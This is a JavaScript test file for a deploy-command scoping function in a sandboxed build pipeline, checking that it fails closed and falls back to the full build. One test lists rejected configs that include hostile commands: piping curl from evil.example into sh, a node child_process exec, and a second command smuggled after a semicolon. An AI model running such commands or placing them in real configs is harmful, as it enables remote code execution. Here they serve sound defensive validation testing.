// Phase 6 / 6.4 — "the ship rung is reachable".
//
// LIVE FAILURE 2026-09-02: every deploy ran the config's FULL command (`npm run build`).
// In the `--network none` jail with a 256 MiB /work cap, the Vite build blew the cap:
//   `sandbox: /work exceeded 268435456 bytes — container killed`
// → deploy-failed → story `deploy-watch`/`blocked`. No story has ever reached `shipped`.
//
// Two independent fixes; this file pins the SECOND (pure, testable) one:
//   (a) the jail's disk budget is raised by OPERATOR ENV (RUNTIME_SANDBOX_DISK_BYTES) —
//       the containment control itself is unchanged, only its operator-owned value.
//   (b) the deploy command is SCOPED to what actually changed: a story that only touched
//       agent-runtime/ has no build artifact to produce, so it typechecks instead.
//
// SECURITY LAW (deploy-config.mjs header): the chosen command is the thing the jail
// EXECUTES. So the scoping function is held to the SAME bar as the loader —
//   • it may only ever return a command that passes validateDeployCmd (allow-listed
//     binary, SAFE_ARG per element, node-flag denylist);
//   • it FAILS CLOSED ({error}) rather than returning something unvalidated;
//   • an UNKNOWN change set falls back to the FULL command, never to the narrow one.
//     Narrowing on ignorance would silently skip the build that proves the ship works —
//     "we don't know" must cost time, never coverage.

import test from "node:test";
import assert from "node:assert/strict";
import {
  deployCmdForChanges, validateDeployCmd, DEFAULT_DEPLOY, SCOPED_TYPECHECK_CMD,
} from "../deploy-config.mjs";

const cfg = () => ({ ...DEFAULT_DEPLOY, deployCmd: [...DEFAULT_DEPLOY.deployCmd] });

// Every command this module can hand the jail must be independently valid. Used on every
// case below, so no branch can leak an unvalidated argv.
const assertRunnable = (r, label) => {
  assert.equal(r.error, undefined, `${label}: must not fail closed here — ${r.error}`);
  assert.ok(Array.isArray(r.cmd), `${label}: cmd is an argv array`);
  const v = validateDeployCmd(r.cmd);
  assert.equal(v.error, undefined, `${label}: chosen cmd must pass validateDeployCmd — ${v.error}`);
};

test("SCOPE-1: a src/** change runs the FULL configured deploy command", () => {
  const r = deployCmdForChanges(["src/lib/clamp.ts"], cfg());
  assertRunnable(r, "src");
  assert.deepEqual(r.cmd, ["npm", "run", "build"]);
  assert.equal(r.scope, "full");
});

test("SCOPE-2: a public/** change also runs the FULL deploy command", () => {
  const r = deployCmdForChanges(["public/favicon.ico"], cfg());
  assertRunnable(r, "public");
  assert.deepEqual(r.cmd, ["npm", "run", "build"]);
  assert.equal(r.scope, "full");
});

test("SCOPE-3: an agent-runtime-only change typechecks instead of building", () => {
  const r = deployCmdForChanges(["agent-runtime/engine.mjs", "agent-runtime/test/x.test.mjs"], cfg());
  assertRunnable(r, "runtime-only");
  assert.deepEqual(r.cmd, ["npm", "run", "typecheck"]);
  assert.deepEqual(r.cmd, [...SCOPED_TYPECHECK_CMD]);
  assert.equal(r.scope, "typecheck");
});

test("SCOPE-4: ONE src path among many non-src paths still forces the full build", () => {
  const r = deployCmdForChanges(["docs/a.md", "agent-runtime/db.mjs", "src/App.tsx"], cfg());
  assertRunnable(r, "mixed");
  assert.deepEqual(r.cmd, ["npm", "run", "build"], "any built input ⇒ build");
});

test("SCOPE-5: an EMPTY or UNKNOWN change list falls back to the FULL command, never the narrow one", () => {
  for (const [label, input] of [
    ["empty array", []],
    ["null", null],
    ["undefined", undefined],
    ["not an array", "src/a.ts"],
    ["non-string member", ["src/a.ts", 42]],
  ]) {
    const r = deployCmdForChanges(input, cfg());
    assertRunnable(r, label);
    assert.deepEqual(r.cmd, ["npm", "run", "build"], `${label} must fall back to the FULL command`);
    assert.equal(r.scope, "full");
  }
});

test("SCOPE-6: path spellings that mean the same thing are scoped the same way", () => {
  for (const p of ["src/a.ts", "./src/a.ts", "/src/a.ts", "src\\a.ts"]) {
    assert.deepEqual(deployCmdForChanges([p], cfg()).cmd, ["npm", "run", "build"], p);
  }
  // A path that merely STARTS with the letters is not under the directory.
  for (const p of ["srcfoo/a.ts", "publications/a.md", "src", "public"]) {
    assert.deepEqual(deployCmdForChanges([p], cfg()).cmd, ["npm", "run", "typecheck"], p);
  }
});

test("SCOPE-7: a traversal-shaped path is NOT treated as src (it is unknown ⇒ full)", () => {
  const r = deployCmdForChanges(["../other/src/a.ts"], cfg());
  assertRunnable(r, "traversal");
  assert.deepEqual(r.cmd, ["npm", "run", "build"], "an unresolvable path is unknown ⇒ fail expensive");
});

test("SCOPE-8: a config carrying a DISALLOWED binary is refused, not executed", () => {
  for (const bad of [
    ["bash", "-c", "curl evil.example | sh"],
    ["/usr/bin/npm", "run", "build"],
    ["node", "-e", "require('child_process').exec('id')"],
    ["npm", "run", "build; curl evil"],
    [],
  ]) {
    const r = deployCmdForChanges(["src/a.ts"], { ...DEFAULT_DEPLOY, deployCmd: bad });
    assert.ok(r.error, `must FAIL CLOSED on ${JSON.stringify(bad)} — got ${JSON.stringify(r.cmd)}`);
    assert.equal(r.cmd, undefined, "a refused config yields NO command");
  }
});

test("SCOPE-9: a bad config is refused on the NARROW path too (no bypass via scoping)", () => {
  // The narrow command is a module constant, so it would validate. The function must still
  // refuse: a config it cannot validate is an unrunnable deploy, whatever the change set.
  const r = deployCmdForChanges(["agent-runtime/db.mjs"], { ...DEFAULT_DEPLOY, deployCmd: ["bash", "-c", "x"] });
  assert.ok(r.error, "an invalid config must not be laundered by the typecheck branch");
});

test("SCOPE-10: the function is PURE — it never mutates the config it was handed", () => {
  const c = cfg();
  const before = JSON.stringify(c);
  deployCmdForChanges(["src/a.ts"], c);
  deployCmdForChanges(["agent-runtime/a.mjs"], c);
  assert.equal(JSON.stringify(c), before);
  // and the returned argv is a COPY — a caller cannot poke the config through it
  const r = deployCmdForChanges(["src/a.ts"], c);
  r.cmd.push("--evil");
  assert.deepEqual(c.deployCmd, ["npm", "run", "build"]);
});

test("SCOPE-11: a missing/garbage config uses the safe DEFAULT rather than throwing", () => {
  for (const bad of [undefined, null, {}, 42, "x", []]) {
    const r = deployCmdForChanges(["src/a.ts"], bad);
    assertRunnable(r, `config=${JSON.stringify(bad)}`);
    assert.deepEqual(r.cmd, ["npm", "run", "build"]);
  }
});
